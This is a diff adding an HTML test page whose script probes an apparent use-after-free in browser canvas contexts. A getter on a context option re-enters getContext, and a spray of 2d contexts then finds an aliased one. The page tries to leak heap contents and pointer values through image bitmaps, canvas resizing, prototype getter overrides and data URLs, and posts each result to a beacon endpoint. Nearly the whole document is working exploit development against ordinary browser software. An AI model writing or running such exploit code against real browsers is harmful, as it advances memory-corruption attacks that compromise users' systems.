@@ -1,0 +1,358 @@
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p635m</title></head>
+<body><pre id="out">p635m: canvas element manipulation with bmr active</pre>
+<script>
+'use strict';
+/*
+  p635m: Exploit the UAF canvas element while bmr context is active
+  -- prior art: p635l confirmed canvas NOT collectible (bmr prevents GC)
+  -- prior art: p635l confirmed .canvas getter is configurable
+  -- prior art: p635l confirmed REGET2D=NULL, toDataURL works (len=150)
+
+  CRASH_CLASS: MODERATE — some phases may crash if bmr internals are touched
+
+  Strategy:
+  A) createImageBitmap from UAF canvas — bmr's ImageBuffer might be uninitialized,
+     pixels could contain heap data
+  B) Canvas resize + readback — trigger reallocation, check for stale data
+  C) Prototype override: redefine .canvas getter, then test tfib(bitmap)
+  D) toDataURL deep analysis — decode PNG, check for metadata/anomalies
+  E) Same-type alias: use inner to draw, read back via canvas element methods
+*/
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, d) {
+  var msg = 'P635M-' + tag + (d !== undefined ? '-' + String(d).slice(0, 500) : '');
+  say(msg);
+  try {
+    var x = new XMLHttpRequest();
+    x.open('POST', '/api/beacon', false);
+    x.setRequestHeader('Content-Type', 'application/json');
+    x.send(JSON.stringify({stage:'p635m', msg:msg, level:'info', sid:'p635m-'+Date.now()}));
+  } catch(e) {
+    try { new Image().src = '/beacon?m=' + encodeURIComponent(msg) + '&t=' + Date.now(); } catch(e2) {}
+  }
+}
+
+function f64hex(v) {
+  try {
+    var buf = new ArrayBuffer(8);
+    new Float64Array(buf)[0] = v;
+    var u = new Uint32Array(buf);
+    return ((u[1]>>>0).toString(16)).padStart(8,'0') + ((u[0]>>>0).toString(16)).padStart(8,'0');
+  } catch(e) { return 'ERR'; }
+}
+
+bk('START', navigator.userAgent);
+
+function triggerUAF() {
+  var cv = document.createElement('canvas');
+  cv.width = 32; cv.height = 32;
+  var inner = null, bmr = null;
+  var opts = {};
+  Object.defineProperty(opts, 'alpha', {
+    get: function() { inner = cv.getContext('2d'); return true; }
+  });
+  bmr = cv.getContext('bitmaprenderer', opts);
+  // Small spray for alias
+  var spray = [];
+  for (var i = 0; i < 30; i++) {
+    var c = document.createElement('canvas');
+    c.width = 32; c.height = 32;
+    spray.push(c.getContext('2d'));
+  }
+  var alias = null, aliasIdx = -1;
+  var SENT = 55555.5;
+  try { inner.lineWidth = SENT; } catch(e) { return null; }
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].lineWidth === SENT) { alias = spray[i]; aliasIdx = i; break; }
+  }
+  return {cv: cv, inner: inner, bmr: bmr, alias: alias, aliasIdx: aliasIdx, spray: spray};
+}
+
+// ================================================================
+// PHASE A: createImageBitmap from UAF canvas
+// ================================================================
+bk('A-START', 'createImageBitmap');
+var uafA = triggerUAF();
+if (uafA && uafA.bmr) {
+  bk('A-ALIAS', uafA.alias ? 'spray['+uafA.aliasIdx+']' : 'NONE');
+
+  // First: draw known pattern through alias to canvas
+  if (uafA.alias) {
+    uafA.alias.fillStyle = '#deadbe';
+    uafA.alias.fillRect(0, 0, 32, 32);
+  }
+
+  // createImageBitmap from the UAF canvas (bmr is active context)
+  try {
+    createImageBitmap(uafA.cv, 0, 0, 32, 32).then(function(bmp) {
+      bk('A-BMP', 'w='+bmp.width+' h='+bmp.height);
+      // Draw to a clean canvas and read pixels
+      var rc = document.createElement('canvas');
+      rc.width = 32; rc.height = 32;
+      var rctx = rc.getContext('2d');
+      rctx.drawImage(bmp, 0, 0);
+      var px = rctx.getImageData(0, 0, 32, 32);
+      // Check for non-pattern data
+      var nonZero = 0, nonDE = 0, samples = [];
+      for (var i = 0; i < px.data.length; i += 4) {
+        if (px.data[i] !== 0 || px.data[i+1] !== 0 || px.data[i+2] !== 0 || px.data[i+3] !== 0) nonZero++;
+        if (px.data[i] !== 0xDE || px.data[i+1] !== 0xAD || px.data[i+2] !== 0xBE) {
+          nonDE++;
+          if (samples.length < 5 && (px.data[i] !== 0 || px.data[i+1] !== 0)) {
+            samples.push('['+(i/4)+']='+px.data[i]+','+px.data[i+1]+','+px.data[i+2]+','+px.data[i+3]);
+          }
+        }
+      }
+      bk('A-PIX', 'nonZero='+nonZero+'/1024 nonPattern='+nonDE+'/1024');
+      if (samples.length > 0) bk('A-SAMPLES', samples.join(' '));
+      // Check f64 for pointers
+      var fv = new Float64Array(px.data.buffer);
+      var ptrs = [];
+      for (var j = 0; j < fv.length; j++) {
+        var buf = new ArrayBuffer(8);
+        new Float64Array(buf)[0] = fv[j];
+        var hi = new Uint32Array(buf)[1];
+        if ((hi >= 0xFFFF8000 && hi < 0xFFFFFFFF) || (hi >= 0x7F000000 && hi <= 0x7FFFFFFF) || (hi >= 0x00000001 && hi <= 0x0000FFFF && hi !== 0)) {
+          ptrs.push('['+j+']='+f64hex(fv[j]));
+        }
+        if (ptrs.length >= 5) break;
+      }
+      bk('A-PTRS', ptrs.length > 0 ? ptrs.join(' ') : 'none');
+      bmp.close();
+      rc = null; rctx = null;
+    }).catch(function(e) {
+      bk('A-BMP-ERR', e.message ? e.message.slice(0,60) : String(e));
+    });
+  } catch(e) { bk('A-CIB-ERR', e.message ? e.message.slice(0,60) : 'fail'); }
+} else {
+  bk('A-SKIP', 'trigger failed');
+}
+
+// Use setTimeout to let createImageBitmap promise resolve
+setTimeout(function() {
+
+bk('A-DONE', 'continued');
+
+// ================================================================
+// PHASE B: Canvas resize + readback
+// ================================================================
+bk('B-START', 'resize+readback');
+var uafB = triggerUAF();
+if (uafB && uafB.alias) {
+  bk('B-ALIAS', 'spray['+uafB.aliasIdx+']');
+
+  // Draw pattern through alias
+  uafB.alias.fillStyle = '#cafeba';
+  uafB.alias.fillRect(0, 0, 32, 32);
+
+  // Read toDataURL before resize
+  try {
+    var url1 = uafB.cv.toDataURL('image/png');
+    bk('B-PRE', 'len='+url1.length);
+  } catch(e) { bk('B-PRE', 'ERR:'+e.message.slice(0,40)); }
+
+  // Resize canvas — triggers internal buffer reallocation
+  uafB.cv.width = 64;
+  uafB.cv.height = 64;
+
+  // Read after resize — should be blank/zero, but might contain stale data
+  try {
+    var url2 = uafB.cv.toDataURL('image/png');
+    bk('B-POST', 'len='+url2.length+' same='+(url1===url2));
+  } catch(e) { bk('B-POST', 'ERR:'+e.message.slice(0,40)); }
+
+  // Check if alias still works after resize
+  try {
+    var lw = uafB.inner.lineWidth;
+    bk('B-INNER-LW', lw);
+  } catch(e) { bk('B-INNER-CRASH', 'inner dead after resize'); }
+
+  // Read pixels from resized canvas via createImageBitmap
+  try {
+    createImageBitmap(uafB.cv, 0, 0, 64, 64).then(function(bmp2) {
+      var rc2 = document.createElement('canvas');
+      rc2.width = 64; rc2.height = 64;
+      var rctx2 = rc2.getContext('2d');
+      rctx2.drawImage(bmp2, 0, 0);
+      var px2 = rctx2.getImageData(0, 0, 64, 64);
+      var nonZero2 = 0;
+      for (var i = 0; i < px2.data.length; i += 4) {
+        if (px2.data[i] || px2.data[i+1] || px2.data[i+2] || px2.data[i+3]) nonZero2++;
+      }
+      bk('B-RESIZE-PIX', 'nonZero='+nonZero2+'/4096');
+      if (nonZero2 > 0) {
+        // Stale data in resized buffer!
+        var fv2 = new Float64Array(px2.data.buffer);
+        var ptrs2 = [];
+        for (var k = 0; k < fv2.length && ptrs2.length < 5; k++) {
+          var buf = new ArrayBuffer(8);
+          new Float64Array(buf)[0] = fv2[k];
+          var hi = new Uint32Array(buf)[1];
+          if (hi >= 0x00000001 && hi !== 0) ptrs2.push('['+k+']='+f64hex(fv2[k]));
+        }
+        if (ptrs2.length) bk('B-RESIZE-PTRS', ptrs2.join(' '));
+      }
+      bmp2.close();
+    }).catch(function(e) { bk('B-BMP-ERR', e.message.slice(0,40)); });
+  } catch(e) { bk('B-CIB-ERR', e.message.slice(0,40)); }
+}
+
+setTimeout(function() {
+
+bk('B-DONE', 'continued');
+
+// ================================================================
+// PHASE C: Prototype override + tfib test
+// ================================================================
+bk('C-START', 'getter override');
+var uafC = triggerUAF();
+if (uafC && uafC.bmr) {
+  // Redefine .canvas on prototype to return a fake canvas
+  var proto = Object.getPrototypeOf(uafC.bmr);
+  var origDesc = Object.getOwnPropertyDescriptor(proto, 'canvas');
+  bk('C-ORIG', 'get='+typeof origDesc.get+' conf='+origDesc.configurable);
+
+  // Create a fake canvas to return
+  var fakeCanvas = document.createElement('canvas');
+  fakeCanvas.width = 32; fakeCanvas.height = 32;
+  fakeCanvas.id = 'fake-canvas';
+
+  Object.defineProperty(proto, 'canvas', {
+    get: function() { return fakeCanvas; },
+    configurable: true
+  });
+
+  // Test: bmr.canvas should now return fakeCanvas without crash
+  try {
+    var c = uafC.bmr.canvas;
+    bk('C-READ', 'type='+typeof c+' id='+(c && c.id)+' tag='+(c && c.tagName));
+  } catch(e) { bk('C-READ-ERR', e.message.slice(0,60)); }
+
+  // Now try transferFromImageBitmap with a real bitmap
+  try {
+    var srcC = document.createElement('canvas');
+    srcC.width = 32; srcC.height = 32;
+    var sctxC = srcC.getContext('2d');
+    sctxC.fillStyle = '#ff00ff';
+    sctxC.fillRect(0, 0, 32, 32);
+
+    createImageBitmap(srcC, 0, 0, 32, 32).then(function(bmpC) {
+      bk('C-TFIB', 'calling tfib with real bitmap');
+      try {
+        uafC.bmr.transferFromImageBitmap(bmpC);
+        bk('C-TFIB-OK', 'SURVIVED!');
+        // If we survived: the bitmap was transferred to the bmr context
+        // Read back via canvas element
+        try {
+          var urlC = uafC.cv.toDataURL();
+          bk('C-TFIB-URL', 'len='+urlC.length);
+        } catch(e2) { bk('C-TFIB-URL', 'ERR:'+e2.message.slice(0,40)); }
+      } catch(e) {
+        bk('C-TFIB-ERR', e.message.slice(0,60));
+      }
+    }).catch(function(e) { bk('C-BMP-ERR', e.message.slice(0,40)); });
+  } catch(e) { bk('C-SETUP-ERR', e.message.slice(0,40)); }
+
+  // Restore original getter
+  try {
+    Object.defineProperty(proto, 'canvas', origDesc);
+    bk('C-RESTORED', 'getter restored');
+  } catch(e) { bk('C-RESTORE-ERR', e.message.slice(0,40)); }
+}
+
+setTimeout(function() {
+
+bk('C-DONE', 'continued');
+
+// ================================================================
+// PHASE D: toDataURL deep analysis
+// ================================================================
+bk('D-START', 'toDataURL analysis');
+var uafD = triggerUAF();
+if (uafD && uafD.bmr) {
+  // PNG from bmr canvas (before any drawing)
+  try {
+    var urlD1 = uafD.cv.toDataURL('image/png');
+    bk('D-PNG-EMPTY', 'len='+urlD1.length);
+    // Decode base64 and check raw bytes
+    var b64 = urlD1.split(',')[1];
+    var raw = atob(b64);
+    bk('D-PNG-BYTES', 'total='+raw.length+' first16='+Array.from(raw.slice(0,16), function(c){return c.charCodeAt(0).toString(16).padStart(2,'0')}).join(''));
+  } catch(e) { bk('D-PNG', 'ERR:'+e.message.slice(0,40)); }
+
+  // Draw through alias, then read PNG
+  if (uafD.alias) {
+    uafD.alias.fillStyle = '#112233';
+    uafD.alias.fillRect(0, 0, 32, 32);
+    try {
+      var urlD2 = uafD.cv.toDataURL('image/png');
+      bk('D-PNG-DRAWN', 'len='+urlD2.length);
+    } catch(e) { bk('D-PNG-DRAWN', 'ERR'); }
+  }
+
+  // Try JPEG
+  try {
+    var urlJ = uafD.cv.toDataURL('image/jpeg', 0.01);
+    bk('D-JPEG', 'len='+urlJ.length+' hdr='+urlJ.slice(0,30));
+  } catch(e) { bk('D-JPEG', 'ERR:'+e.message.slice(0,40)); }
+
+  // Try WebP
+  try {
+    var urlW = uafD.cv.toDataURL('image/webp', 0.01);
+    bk('D-WEBP', 'len='+urlW.length+' hdr='+urlW.slice(0,30));
+  } catch(e) { bk('D-WEBP', 'ERR:'+e.message.slice(0,40)); }
+}
+
+bk('D-DONE', 'survived');
+
+// ================================================================
+// PHASE E: Inner after canvas resize — use-after-realloc?
+// ================================================================
+bk('E-START', 'inner after resize');
+var uafE = triggerUAF();
+if (uafE && uafE.alias) {
+  // Write known values through alias
+  uafE.alias.lineWidth = 99999;
+  uafE.alias.miterLimit = 88888;
+  uafE.alias.globalAlpha = 0.12345;
+  bk('E-PRE', 'lw='+uafE.inner.lineWidth+' ml='+uafE.inner.miterLimit+' ga='+uafE.inner.globalAlpha);
+
+  // Resize canvas — might reallocate the context's backing buffer
+  uafE.cv.width = 1;
+  uafE.cv.height = 1;
+
+  // Read through inner — do values persist or reset?
+  try {
+    var lwPost = uafE.inner.lineWidth;
+    var mlPost = uafE.inner.miterLimit;
+    var gaPost = uafE.inner.globalAlpha;
+    bk('E-POST', 'lw='+lwPost+' ml='+mlPost+' ga='+gaPost);
+    if (lwPost !== 99999 || mlPost !== 88888) {
+      bk('E-STALE', 'VALUES CHANGED! lw='+f64hex(lwPost)+' ml='+f64hex(mlPost));
+    }
+  } catch(e) { bk('E-POST-CRASH', e.message.slice(0,60)); }
+
+  // Resize bigger, read again
+  uafE.cv.width = 256;
+  uafE.cv.height = 256;
+  try {
+    var lw2 = uafE.inner.lineWidth;
+    bk('E-BIG', 'lw='+lw2+' ga='+uafE.inner.globalAlpha);
+    // Read transform
+    var t = uafE.inner.getTransform();
+    bk('E-TX', 'a='+f64hex(t.a)+' d='+f64hex(t.d)+' e='+f64hex(t.e));
+  } catch(e) { bk('E-BIG-CRASH', e.message.slice(0,60)); }
+}
+
+bk('E-DONE', 'survived');
+bk('DONE', 'all phases complete');
+
+}, 500); // Phase C+D timeout
+}, 500); // Phase B timeout
+}, 500); // Phase A timeout
+</script>
+</body></html>
